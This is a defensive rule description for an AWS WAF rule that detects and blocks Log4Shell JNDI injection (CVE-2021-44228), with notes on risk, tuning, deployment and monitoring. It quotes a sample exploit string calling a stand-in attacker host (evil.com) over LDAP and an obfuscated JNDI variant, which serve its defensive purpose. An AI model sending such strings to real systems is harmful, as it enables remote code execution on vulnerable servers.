name: AWS WAF — Block Log4Shell JNDI Injection (CVE-2021-44228)
objective: Detect and block Log4Shell exploitation attempts (CVE-2021-44228) by identifying JNDI lookup patterns in all request headers, URI, and body. Targets Java applications using Log4j 2.x in affected versions.
risk_mitigated: Remote Code Execution (CVSS 10.0) via Log4j JNDI injection in CVE-2021-44228 and related variants (CVE-2021-45046, CVE-2021-45105). An attacker sends a crafted string (e.g., ${jndi:ldap://evil.com/a}) that is logged by Log4j and triggers an outbound LDAP/RMI connection to load remote code.
potential_side_effects: Minimal expected false positives — ${jndi: patterns have no legitimate use in HTTP traffic. Regex-based detection may miss heavily obfuscated variants; pair with OS-level network egress controls for defense in depth.
tuning_notes: Deploy in 'Count' mode for 24 hours to baseline, then switch to 'Block'. Variants using obfuscated JNDI syntax (e.g., ${${lower:j}ndi:...) are covered by the broad regex patterns below. Consider also blocking outbound LDAP (port 389/636/1099) at the network level.
deployment_notes: This rule targets all input locations (headers, URI, body) because Log4j processes any logged input, including User-Agent and X-Api-Version headers. Enable extended body inspection if your WebACL does not include it by default.
monitoring_notes: Any trigger from this rule is a critical alert. Immediately investigate the source IP, the full request, and whether the targeted application logged the string.
